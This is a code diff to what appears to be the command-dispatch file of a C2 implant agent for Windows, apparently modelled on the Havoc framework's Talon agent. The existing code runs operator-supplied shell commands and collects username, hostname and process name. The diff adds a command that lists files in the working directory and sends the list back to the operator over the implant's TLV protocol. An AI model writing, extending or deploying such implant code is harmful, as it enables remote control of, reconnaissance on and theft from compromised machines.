@@ -7,11 +7,14 @@
 #include <communication.h>
 #include <commands.h>
 
-#define COMMAND_COUNT 2
+#define COMMAND_COUNT 3
 
 Command commands[COMMAND_COUNT] = {
   {.id = 0, .function = identify_cmd },
   {.id = 7, .function = shell_cmd },
+  
+  // fs 
+  {.id = 100, .function = fs_dir_cmd },
 };
 
 void execute_cmd(int taskActionId, int taskId, int argc, struct TLVBuild * tlv) {
@@ -44,6 +47,10 @@ void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   extractBytes(tlv, cmdSize, cmd);
   cmd[cmdSize] = 0x00;
   printf("[cmd] executing: %s\n", cmd);
+
+  /**
+   * https://github.com/HavocFramework/Talon/blob/main/Agent/Source/Command.c
+   */
 
   HANDLE hStdInPipeRead = NULL;
   HANDLE hStdInPipeWrite = NULL;
@@ -121,6 +128,7 @@ void identify_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   identifyMessage.buf = malloc(50);
   identifyMessage.allocsize = 50;
   identifyMessage.bufsize = 0;
+  identifyMessage.read_cursor = 0;
 
   char * username = malloc(UNLEN + 1);
   DWORD usernameLen = UNLEN + 1;
@@ -159,4 +167,49 @@ void identify_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   free(hostname);
   free(processName);
   free(identifyMessage.buf);
+}
+
+void fs_dir_cmd(int taskId, int argc, struct TLVBuild * tlv) {
+  printf("[+] listing files\n");
+
+  struct TLVBuild response;
+  response.read_cursor = 0;
+  response.allocsize = 10;
+  response.bufsize = 0;
+  response.buf = malloc(10);
+  
+  struct TLVBuild file_list;
+  file_list.read_cursor = 0;
+  file_list.allocsize = 10;
+  file_list.bufsize = 0;
+  file_list.buf = malloc(10);
+  
+  char * path = ".\\*";
+  WIN32_FIND_DATA fdFile;
+  HANDLE hFile;
+
+  int i = 0;
+
+  if (hFile = FindFirstFile(path, &fdFile)) {
+
+    do {
+      addString(&file_list, fdFile.cFileName);
+      i++;
+    } while (FindNextFile(hFile, &fdFile));
+
+  };
+
+  addInt32(&response, i);
+  addBytes(&response, false, file_list.bufsize, file_list.buf);
+
+  send_output(
+    taskId,
+    "output",
+    "",
+    response.bufsize, 
+    response.buf
+  );
+
+  free(response.buf);
+  free(file_list.buf);
 }
